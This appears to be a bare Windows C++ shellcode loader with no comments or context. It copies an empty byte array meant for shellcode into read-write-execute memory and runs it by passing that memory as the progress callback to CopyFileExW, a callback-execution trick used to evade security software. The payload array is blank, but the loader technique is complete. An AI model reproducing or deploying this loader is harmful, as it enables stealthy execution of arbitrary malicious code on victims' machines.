#include <windows.h>
#include <stdio.h>
unsigned char op[] ="";
int main() {
    LPVOID addr = ::VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, op, sizeof(op));

    ::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
    ::CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)addr, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);

}
